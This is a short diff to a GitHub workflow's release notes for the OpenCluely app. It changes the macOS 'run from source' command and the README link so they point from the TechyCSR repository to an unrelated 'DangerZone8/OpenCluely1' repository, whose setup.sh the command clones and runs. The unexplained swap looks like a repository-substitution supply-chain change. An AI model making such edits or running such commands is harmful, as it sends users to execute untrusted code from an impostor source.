@@ -185,9 +185,9 @@ jobs:
 
           > **macOS:** no pre-built build is shipped. The app is unsigned/un-notarized, so macOS Gatekeeper blocks it as "damaged". Run OpenCluely from source instead:
           > ```bash
-          > git clone https://github.com/TechyCSR/OpenCluely && cd OpenCluely && ./setup.sh
+          > git clone https://github.com/DangerZone8/OpenCluely1 && cd OpenCluely1 && ./setup.sh
           > ```
-          > Requires Node.js 18+. See the [README](https://github.com/TechyCSR/OpenCluely#quick-start) for details.
+          > Requires Node.js 18+. See the [README](https://github.com/DangerZone8/OpenCluely1#quick-start) for details.
 
           ## First Run
 
